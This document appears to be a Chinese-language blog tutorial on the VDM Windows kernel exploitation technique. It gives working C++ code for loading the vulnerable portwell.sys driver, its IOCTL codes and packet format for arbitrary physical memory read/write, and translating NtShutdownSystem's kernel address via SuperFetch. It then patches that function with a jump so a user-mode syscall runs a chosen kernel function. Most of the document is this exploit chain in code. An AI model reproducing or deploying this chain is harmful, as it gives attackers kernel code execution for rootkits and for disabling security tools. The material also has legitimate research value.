之前介绍了几个漏洞驱动，由于大多驱动都是使用MMMapIOSpace进行内存映射，而此函数在新版Windows中被强制加入了限制无法映射PFN页表，我们无法将物理内存转换为虚拟内存，因此无法实现直接的利用。

下面介绍一种利用方式 ([VDM](https://back.engineering/blog/01/11/2020/)) ：

首先，我们需要知道我们的目标：`在内核中执行我们的代码`。我们的程序运行在R3，而R3和R0通信有两种，一种是跟驱动进行通信，另外一种则是R3调用一些需要R0处理的系统服务函数。这种方式则是修改一个系统服务函数，表面上看R3执行的是系统函数，实际在R0中执行的代码已经被修改替换。

这里我选择的是被记录在`SSDT`表中的`NtShutdownSystem`。在R3层中，进程可以调用`ntdll.dll`中的`NtShutdownSystem`来进入R0中`ntoskrnl.exe`的`NtShutdownSystem`。有很多函数都可以被选择，我选择这个函数是因为它有三个优点：

- 1.`ntoskrnl.exe`直接导出，RVA定位稳定
- 2.不依赖`win32k`会话状态和用户态回调表
- 3.函数很冷门，正常情况下不会被其他进程调用

**下面开始操作：**
1.在R3中找到这个函数
在`ntdll.dll`的导出表中可以找到`NtShutdownSystem`，它是进入内核的系统服务入口。

```text title="ntdll.dll: exports"
        643  27A 001626A0 NtShutdownSystem
```

很简单的函数，检查 `KUSER_SHARED_DATA` 中的系统调用模式标志，直接`syscall`进入R0。

2.在R0中定位目标函数
在`ntoskrnl.exe`的导出表中可以找到`NtShutdownSystem`

```text title="ntoskrnl.exe: exports"
       1771  6C5 00612590 NtShutdownSystem
```

这里我选择使用[SuperFetch](https://github.com/jonomango/superfetch)库将虚拟地址转换为物理地址(此技术原理在[此处](https://v1k1ngfr.github.io/superfetchquery-superpower/)可找到详细分析)，避免扫描到其他内存区域导致系统BSOD。
我们仅需找出`ntoskrnl.exe`中导出的函数`NtShutdownSystem`的RVA，再加上`ntoskrnl.exe`在R0中的加载基址得到虚拟地址，最后转换为物理地址即可。

3.关键代码

首先解析磁盘上的PE导出表，拿到目标函数RVA：

```cpp
std::uint32_t find_export_rva(std::byte const* base, char const* name) {
  auto const dos = reinterpret_cast<IMAGE_DOS_HEADER const*>(base);
  auto const nt = reinterpret_cast<IMAGE_NT_HEADERS64 const*>(base + dos->e_lfanew);
  auto const sections = IMAGE_FIRST_SECTION(nt);

  auto rva_to_ptr = [&](std::uint32_t const rva) -> std::byte const* {
    if (rva < nt->OptionalHeader.SizeOfHeaders)
      return base + rva;

    auto contains = [rva](IMAGE_SECTION_HEADER const& section) {
      auto const size = std::max(section.SizeOfRawData, section.Misc.VirtualSize);
      return rva >= section.VirtualAddress && rva < section.VirtualAddress + size;
    };

    for (auto i = WORD{}; i < nt->FileHeader.NumberOfSections; ++i)
      if (contains(sections[i]))
        return base + sections[i].PointerToRawData + (rva - sections[i].VirtualAddress);

    return nullptr;
  };

  auto const& directory = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  auto const exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY const*>(rva_to_ptr(directory.VirtualAddress));
  auto const names = reinterpret_cast<DWORD const*>(rva_to_ptr(exports->AddressOfNames));
  auto const ordinals = reinterpret_cast<WORD const*>(rva_to_ptr(exports->AddressOfNameOrdinals));
  auto const functions = reinterpret_cast<DWORD const*>(rva_to_ptr(exports->AddressOfFunctions));

  for (auto i = DWORD{}; i < exports->NumberOfNames; ++i) {
    auto const export_name = reinterpret_cast<char const*>(rva_to_ptr(names[i]));
    if (export_name && std::strcmp(export_name, name) == 0)
      return functions[ordinals[i]];
  }

  return 0;
}
```

然后枚举当前加载的内核模块，取到`ntoskrnl.exe`在R0中的基址：

```cpp
std::uint64_t kernel_module_base(std::wstring_view module_name) {
  auto bases = std::vector<LPVOID>(1024);
  auto needed = DWORD{};

  while (EnumDeviceDrivers(bases.data(), DWORD(bases.size() * sizeof(LPVOID)), &needed)
         && needed > bases.size() * sizeof(LPVOID)) {
    bases.resize(needed / sizeof(LPVOID));
  }

  bases.resize(needed / sizeof(LPVOID));

  auto read_name = [](LPVOID const base) {
    std::wstring buffer(MAX_PATH, L'\0');
    buffer.resize(GetDeviceDriverBaseNameW(base, buffer.data(), DWORD(buffer.size())));
    return buffer;
  };

  for (auto const base : bases)
    if (read_name(base) == module_name)
      return reinterpret_cast<std::uint64_t>(base);

  return 0;
}
```

取到物理地址后，我们便可利用有物理内存读写漏洞的驱动进行修改。这里使用`portwell.sys`作为任意物理读写原语，然后接上VDM的调用系统函数逻辑。

`portwell.sys`创建设备名为`\\.\PORTWELL_0_1`，物理读写请求包为固定的`0x10`字节头：

```cpp
#pragma pack(push, 1)
struct packet {
  std::uint64_t physical;
  std::uint32_t width;
  std::uint32_t count;
};
#pragma pack(pop)

static_assert(sizeof(packet) == 0x10);
```

其中`physical`是目标物理地址，`width`是单次访问宽度，`count`是访问次数。这里统一使用`width = 1`，也就是按字节读写。

IDA中看到物理读路径对应`0xEA606450`，物理写路径对应`0xEA60A454`：

```cpp
inline constexpr auto device_path = LR"(\\.\PORTWELL_0_1)";
inline constexpr auto read_ioctl = DWORD{0xEA606450};
inline constexpr auto write_ioctl = DWORD{0xEA60A454};
```

加载驱动时需要管理员权限，并先申请`SeLoadDriverPrivilege`：

```cpp
std::expected<driver, std::wstring> driver::load() {
  auto const privilege = enable_token_privilege(SE_LOAD_DRIVER_NAME);
  if (!privilege)
    return std::unexpected(privilege.error());

  auto const driver_path = module_directory() + driver_file;
  if (GetFileAttributesW(driver_path.c_str()) == INVALID_FILE_ATTRIBUTES)
    return std::unexpected(L"Missing driver file: " + driver_path);

  auto result = driver{};
  result.scm_ = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
  if (!result.scm_)
    return std::unexpected(L"OpenSCManagerW failed: " + win32_error());

  result.service_ = CreateServiceW(
    result.scm_,
    service_name,
    service_name,
    SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
    driver_path.c_str(),
    nullptr,
    nullptr,
    nullptr,
    nullptr,
    nullptr);

  if (!result.service_) {
    auto const error = GetLastError();
    if (error != ERROR_SERVICE_EXISTS)
      return std::unexpected(L"CreateServiceW failed: " + win32_error(error));

    result.service_ = OpenServiceW(
      result.scm_,
      service_name,
      SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);

    if (!result.service_)
      return std::unexpected(L"OpenServiceW failed: " + win32_error());
  } else {
    result.created_service_ = true;
  }

  if (!StartServiceW(result.service_, 0, nullptr)) {
    auto const error = GetLastError();
    if (error != ERROR_SERVICE_ALREADY_RUNNING)
      return std::unexpected(L"StartServiceW failed: " + win32_error(error));
  }

  result.device_ = CreateFileW(
    device_path,
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    nullptr,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    nullptr);

  if (result.device_ == INVALID_HANDLE_VALUE)
    return std::unexpected(L"CreateFileW failed: " + win32_error());

  return result;
}
```

读物理内存时，输入缓冲区只放`packet`，输出缓冲区接收读取结果：

```cpp
bool driver::read_phys(std::uint64_t const physical, void* const buffer, std::size_t const size) const {
  auto request = packet{
    .physical = physical,
    .width = 1,
    .count = static_cast<std::uint32_t>(size),
  };

  auto output = std::vector<std::byte>(size);
  auto returned = DWORD{};
  auto const ok = DeviceIoControl(
    device_,
    read_ioctl,
    &request,
    sizeof(request),
    output.data(),
    static_cast<DWORD>(output.size()),
    &returned,
    nullptr);

  if (!ok)
    return false;

  std::memcpy(buffer, output.data(), size);
  return true;
}
```

写物理内存时，输入缓冲区由`packet + data`组成：

```cpp
bool driver::write_phys(std::uint64_t const physical, void const* const buffer, std::size_t const size) const {
  auto input = std::vector<std::byte>(sizeof(packet) + size);
  auto const request = packet{
    .physical = physical,
    .width = 1,
    .count = static_cast<std::uint32_t>(size),
  };

  std::memcpy(input.data(), &request, sizeof(request));
  std::memcpy(input.data() + sizeof(request), buffer, size);

  auto returned = DWORD{};
  return DeviceIoControl(
    device_,
    write_ioctl,
    input.data(),
    static_cast<DWORD>(input.size()),
    nullptr,
    0,
    &returned,
    nullptr);
}
```

有了物理读写后，VDM的核心思路就很直接：保存`NtShutdownSystem`的原始字节，将它临时改成`jmp qword ptr [rip+0]`，跳转目标写成我们希望调用的内核函数地址。R3继续调用`ntdll.dll!NtShutdownSystem`，进入R0后实际执行的就变成了我们指定的内核函数。

```cpp
template <class T, class... Args>
std::invoke_result_t<T, Args...> syscall(void* kernel_target, Args... args) const {
  using result_type = std::invoke_result_t<T, Args...>;

  auto const module = LoadLibraryA(target_user_module);
  auto const proc = module ? GetProcAddress(module, target_export) : nullptr;
  if (!proc || !kernel_target)
    return result_type{};

  auto lock = std::lock_guard{mutex_};

  auto patch = std::array<std::uint8_t, 14>{
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  };
  std::memcpy(patch.data() + 6, &kernel_target, sizeof(kernel_target));

  auto original = std::array<std::uint8_t, 14>{};
  if (!driver_.read_phys(syscall_physical_, original.data(), original.size()))
    return result_type{};

  if (!driver_.write_phys(syscall_physical_, patch.data(), patch.size()))
    return result_type{};

  auto patched = std::array<std::uint8_t, 14>{};
  if (!driver_.read_phys(syscall_physical_, patched.data(), patched.size()))
    return result_type{};

  if (patched != patch) {
    driver_.write_phys(syscall_physical_, original.data(), original.size());
    return result_type{};
  }

  auto const restore = [&] {
    driver_.write_phys(syscall_physical_, original.data(), original.size());
  };

  if constexpr (std::is_void_v<result_type>) {
    reinterpret_cast<T>(proc)(args...);
    restore();
  } else {
    auto result = reinterpret_cast<T>(proc)(args...);
    restore();
    return result;
  }
}
```

这里演示调用`ntoskrnl.exe`中的`memcpy`，读取内核基址处的两个字节，用来验证是否能在R0里读到`MZ`。

主流程如下：

```cpp
using memcpy_t = void*(__cdecl*)(void*, void const*, std::size_t);

auto const debug_privilege = demo::enable_debug_privilege();
auto const syscall_location = demo::locate_kernel_export(demo::target_export);
auto const memcpy_rva = demo::find_export_rva(syscall_location->module.path, "memcpy");

auto const syscall_va = syscall_location->module.base + syscall_location->rva;
auto const memcpy_va = syscall_location->module.base + *memcpy_rva;

auto const memory = spf::memory_map::current();
auto const syscall_pa = demo::translate_to_physical(*memory, syscall_va);

auto driver = demo::portwell::driver::load();

auto const nt_base_pa = demo::translate_to_physical(*memory, syscall_location->module.base);
auto direct_mz = std::uint16_t{};
driver->read_phys(*nt_base_pa, &direct_mz, sizeof(direct_mz));

auto vdm = demo::vdm::context{*driver, *syscall_pa};

auto mz = std::uint16_t{};
auto const memcpy_result = vdm.syscall<memcpy_t>(
  reinterpret_cast<void*>(memcpy_va),
  &mz,
  reinterpret_cast<void const*>(syscall_location->module.base),
  sizeof(mz));
```

- `kernel MZ`来自VDM方式调用R0中的`memcpy`

最后再总结一下这条利用链：

1. R3申请`SeDebugPrivilege`，用于SuperFetch查询PFN信息。
2. 枚举内核模块，找到导出`NtShutdownSystem`的`ntoskrnl.exe`。
3. 解析磁盘PE导出表，得到`NtShutdownSystem`和`memcpy`的RVA。
4. 用模块R0基址加RVA得到R0虚拟地址。
5. 通过SuperFetch将`NtShutdownSystem`的R0虚拟地址转换为物理地址。
6. 通过`portwell.sys`物理写，临时把`NtShutdownSystem`改成跳转到内核`memcpy`。
7. 从R3调用`ntdll.dll!NtShutdownSystem`，实际在R0执行`memcpy`。
8. 调用完成后立刻恢复`NtShutdownSystem`原始字节。

这种方式的优点是不需要驱动提供虚拟地址读写，也不需要自己构造内核线程。只要能稳定地把目标系统服务入口转换到物理地址，并且漏洞驱动的物理写原语可用，就可以把一次普通的R3系统调用变成一次受控的R0函数调用。
